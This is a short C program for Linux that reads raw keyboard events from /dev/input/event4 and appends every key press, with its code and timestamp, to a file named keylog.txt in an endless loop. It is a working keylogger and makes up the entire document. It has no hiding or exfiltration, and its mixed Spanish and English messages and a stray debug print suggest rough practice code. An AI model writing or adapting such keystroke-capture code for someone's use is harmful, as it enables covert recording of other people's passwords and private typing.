#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <time.h>

#define DEVICE "/dev/input/event4"

int main() {
    struct input_event event;
    int fd;

    fd = open(DEVICE, O_RDONLY);
    printf("2");
    if (fd == -1) {
        perror("Error al abrir el dispositivo");
        return EXIT_FAILURE;
    }

    FILE *log_file = fopen("keylog.txt", "a");
    if (log_file == NULL) {
        close(fd);
        perror("Error opening log file");
        return EXIT_FAILURE;
    }

    while (1) {
        read(fd, &event, sizeof(struct input_event));

        if (event.type == EV_KEY && event.value == 1) {
            fprintf(log_file, "Tecla: %d, Timestamp: %ld.%06ld\n", 
                    event.code, event.time.tv_sec, event.time.tv_usec);
            fflush(log_file);
        }
    }

    fclose(log_file);
    close(fd);

    return 0;
}
